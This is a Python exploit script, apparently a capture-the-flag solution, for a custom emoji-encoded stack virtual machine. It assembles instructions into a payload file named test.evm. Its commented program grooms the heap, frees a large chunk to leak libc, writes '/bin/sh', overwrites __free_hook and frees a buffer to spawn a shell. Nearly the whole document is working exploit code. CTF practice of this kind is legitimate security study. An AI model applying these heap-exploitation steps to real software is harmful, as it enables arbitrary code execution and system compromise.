#!/usr/bin/python3
# -*- coding: utf-8 -*-

class Assembler(object):
    text_table = "🈳➕➖❌❓❎👫💀💯🚀🈶🈚⏬🔝📤📥🆕🆓📄📝🔡🔢🛑"
    data_table = "😀😁😂🤣😜😄😅😆😉😊😍"
    inst_str = ["NOP", "ADD", "SUB", "MUL", "MOD", "XOR", "AND", "LESS", "EQ",
                "JMP", "JMPT", "JMPF", "PUSH", "POP", "GET_BYTE", "SET_BYTE",
                "NEW_GBUF", "DEL_GBUF", "READ_GBUF", "WRITE_GBUF", "PSTACK",
                "PVAL", "HALT"]

    def __init__(self, code):
        self.code = code.split("\n")

    def __str__(self):
        self.text = ""

        for line in self.code:
            line = line.split()
            assert line[0] in self.inst_str
            for i in range(len(self.inst_str)):
                if line[0] == self.inst_str[i]:
                    self.text += self.text_table[i]
                    break
            else:
                raise AssertionError("invalid instruction")
            if line[0] == "PUSH":
                self.text += self.data_table[int(line[1])]
        return self.text


code = """PUSH 10
PUSH 10
MUL
NEW_GBUF  // allocate 100 bytes of mem (guard)
PUSH 10
PUSH 10
MUL
PUSH 10
MUL
PUSH 10
PUSH 10
MUL
ADD
NEW_GBUF  // allocate 1100 bytes of mem (non-tcache size)
PUSH 10
PUSH 10
MUL
NEW_GBUF  // allocate 100 bytes of mem
PUSH 10
PUSH 10
MUL
NEW_GBUF  // allocate 100 bytes of mem (guard)
PVAL
PVAL
PVAL
PVAL
PUSH 0
PUSH 10
PSTACK
PVAL
PUSH 0
PUSH 10
PSTACK
PVAL
PUSH 0
PUSH 10
PSTACK
PVAL
PUSH 0
PUSH 10
PSTACK
PVAL
PUSH 0
PUSH 10
PSTACK
PVAL
PUSH 0
PUSH 10
PSTACK
PUSH 1
READ_GBUF
PUSH 8  // make -864 (st)
PUSH 10
MUL
PUSH 6
ADD
PUSH 10
MUL
PUSH 4
ADD
PUSH 0
SUB  // make -864 (en)
ADD  // ofs_100 + ofs_100_to_tmp == ofs_tmp
PUSH 1
DEL_GBUF  // free gptr[1]
PUSH 2
WRITE_GBUF  // leak libc
PUSH 10
PUSH 10
MUL
PUSH 10
MUL
PUSH 10
PUSH 10
MUL
ADD
NEW_GBUF  // allocate again 1100 bytes of mem @ idx 1
PUSH 1
READ_GBUF
PUSH 0
READ_GBUF  // write "/bin/sh\0"
PUSH 2
READ_GBUF  // overwrite __free_hook
PUSH 0
DEL_GBUF  // trigger system("/bin/sh")
HALT"""

assembler = Assembler(code)
with open("test.evm", "w") as f:
    f.write(str(assembler))